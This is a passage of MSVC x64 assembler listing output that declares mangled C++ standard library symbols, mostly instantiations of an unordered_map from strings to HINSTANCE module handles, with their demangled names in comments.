PUBLIC	??$_Emplace_back@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAXAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Emplace_back<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
PUBLIC	??$_Adl_verify_range@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@PEAV12@@std@@YAXAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0@Z ; std::_Adl_verify_range<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
PUBLIC	??$construct_at@PEADAEAPEAD$0A@@std@@YAPEAPEADQEAPEADAEAPEAD@Z ; std::construct_at<char *,char * &,0>
PUBLIC	??$forward@M@std@@YA$$QEAMAEAM@Z		; std::forward<float>
PUBLIC	??$forward@U_Zero_then_variadic_args_t@std@@@std@@YA$$QEAU_Zero_then_variadic_args_t@0@AEAU10@@Z ; std::forward<std::_Zero_then_variadic_args_t>
PUBLIC	??$_Destroy_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@@Z ; std::_Destroy_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>
PUBLIC	??$_Freenode@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
PUBLIC	??$forward@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@YAAEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@0@AEBV10@@Z ; std::forward<std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
PUBLIC	??$_Kfn@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@SAAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@AEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Kfn<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>
PUBLIC	??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >
PUBLIC	??$forward@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@std@@YA$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@AEAU10@@Z ; std::forward<std::pair<char const *,HINSTANCE__ *> >
PUBLIC	??$forward@AEAPEAUHINSTANCE__@@@std@@YAAEAPEAUHINSTANCE__@@AEAPEAU1@@Z ; std::forward<HINSTANCE__ * &>
PUBLIC	??$forward@PEBD@std@@YA$$QEAPEBDAEAPEBD@Z	; std::forward<char const *>
PUBLIC	??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	??$to_address@PEBD@std@@YAPEAPEBDQEAPEBD@Z	; std::to_address<char const *>
PUBLIC	??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	??$?0M@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAM@Z ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1><float>
PUBLIC	??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
PUBLIC	?_Do_hash@?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@SA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ; std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::_Do_hash
PUBLIC	?deallocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAXQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::deallocate
PUBLIC	?_Orphan_ptr2@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_ptr2
PUBLIC	?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z ; std::_Narrow_char_traits<char,int>::compare
PUBLIC	?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z ; std::_Narrow_char_traits<char,int>::find
PUBLIC	?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
PUBLIC	??R?$_Conditionally_enabled_hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@$00@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ; std::_Conditionally_enabled_hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,1>::operator()
PUBLIC	?_Get_first@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEBAAEBU?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Get_first
PUBLIC	?deallocate@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::deallocate
PUBLIC	?_Make_iter@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Make_iter
PUBLIC	?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_erase
PUBLIC	??0?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAA@XZ ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
PUBLIC	?_Erase_bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase_bucket
PUBLIC	??0?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@@Z ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
PUBLIC	??1?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::~_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>
PUBLIC	?_Release@?$_Uninitialized_backout@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@XZ ; std::_Uninitialized_backout<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *>::_Release
PUBLIC	??$_Get_size_of_n@$0DI@@std@@YA_K_K@Z		; std::_Get_size_of_n<56>
PUBLIC	??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@0@Z ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>
PUBLIC	??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
PUBLIC	??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ; std::fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
PUBLIC	??$uninitialized_fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z ; std::uninitialized_fill<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > *,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
PUBLIC	??$_Get_unwrapped@AEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA?A_TAEBQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > * const &>
PUBLIC	??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z ; std::_Construct_in_place<char *,char * &>
PUBLIC	??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>
PUBLIC	??$?0U_Zero_then_variadic_args_t@std@@M@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAU21@$$QEAM@Z ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1><std::_Zero_then_variadic_args_t,float>
